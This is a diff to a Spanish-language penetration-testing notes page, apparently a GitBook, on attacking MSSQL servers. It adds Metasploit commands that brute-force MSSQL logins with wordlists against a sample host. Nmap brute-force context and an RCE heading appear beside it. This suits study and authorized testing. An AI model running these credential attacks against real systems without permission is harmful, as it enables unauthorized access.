@@ -12,6 +12,27 @@ nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/c
 
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
+### Metasploit
+
+Para hacer fuerza bruta usaremos los siguientes modulos:
+
+<pre class="language-perl"><code class="lang-perl"><strong>msfconsole
+</strong><strong>
+</strong><strong>use auxiliary/scanner/mssql/mssql_login
+</strong>
+set RHOSTS 192.168.1.1
+
+set USER_FILE /root/Desktop/wordlist/common_users.txt
+
+set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+
+set VERBOSE false
+
+exploit
+</code></pre>
+
+<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+
 ## RCE
 
 Podemos hacer un RCE si tenemos credenciales de acceso y los permisos necesarios. Usaremos un script de nmap para ello:
